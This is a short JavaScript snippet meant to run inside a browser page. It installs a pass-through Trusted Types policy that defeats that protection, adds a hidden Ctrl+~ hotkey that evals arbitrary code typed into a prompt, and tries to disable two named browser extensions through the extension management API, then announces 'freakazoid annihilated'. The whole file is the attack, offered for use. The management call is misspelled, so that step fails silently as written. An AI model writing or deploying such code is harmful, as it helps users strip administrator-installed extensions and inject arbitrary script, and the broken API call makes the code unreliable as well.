/// x.js
(()=>{
  let p;
  try {
    p = trustedTypes.createPolicy('pp', {
      createScript: x => x
    });
  } catch (e) {}
  addEventListener('keyup',e => {
    if (e.key == '~' && e.ctrlKey) try {
      let x = prompt();
      if (p) x = p.createScript(x);
      alert(JSON.stringify(eval(x)));
    } catch (e) {
      alert(e);
    }
  });
  x=chrome?.managment?.setEnabled;x?.('hkobaiihndnbfhbkmjjfbdimfbdcppdh',false);x?.('ckecmkbnoanpgplccmnoikfmpcdladkc',false);if(x)alert('freakazoid annihilated');
})();
